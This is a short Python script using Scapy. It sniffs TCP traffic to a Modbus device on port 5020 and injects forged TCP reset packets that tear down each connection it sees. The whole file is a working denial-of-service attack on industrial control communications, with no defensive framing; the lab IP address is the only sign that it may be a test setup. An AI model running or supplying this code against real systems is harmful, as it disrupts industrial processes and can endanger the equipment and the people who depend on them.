from scapy.all import *

def rst_attack(pkt):
    """ Sends a TCP RST (reset) packet to terminate an ongoing Modbus TCP connection """
    
    if pkt[TCP].dport == 5020 and pkt[TCP].flags != "R":  # Check if the packet is a Modbus TCP packet and not a RST packet
        print(f"[📡] Sniffed connection from {pkt[IP].src} to slave {pkt[IP].dst}")  # Display source and destination IP
        ip = IP(src=pkt[IP].src, dst=pkt[IP].dst)  # Create an IP layer with source and destination IPs
        
        # If the packet has raw data, calculate the length of the TCP segment
        if Raw in pkt:
            tcp_seg_len = len(pkt.getlayer(Raw).load)
        else:
            tcp_seg_len = 0
        
        # Create the RST packet, with appropriate sequence and acknowledgment numbers
        tcp = TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, flags="R", 
                  seq=pkt[TCP].seq + tcp_seg_len, ack=pkt[TCP].ack + tcp_seg_len)
        pkt = ip/tcp  # Create the full packet with IP and TCP layers
        
        # Send the crafted RST packet
        send(pkt, verbose=0)
        print("[✅] RST packet sent")  # Confirm that the RST packet has been sent

# Start sniffing TCP packets for Modbus communication on a specific host
print("[🚀] Start sniffing on TCP for Modbus communication")
sniff(iface="ens37", filter="tcp and host 192.168.36.129", prn=rst_attack)

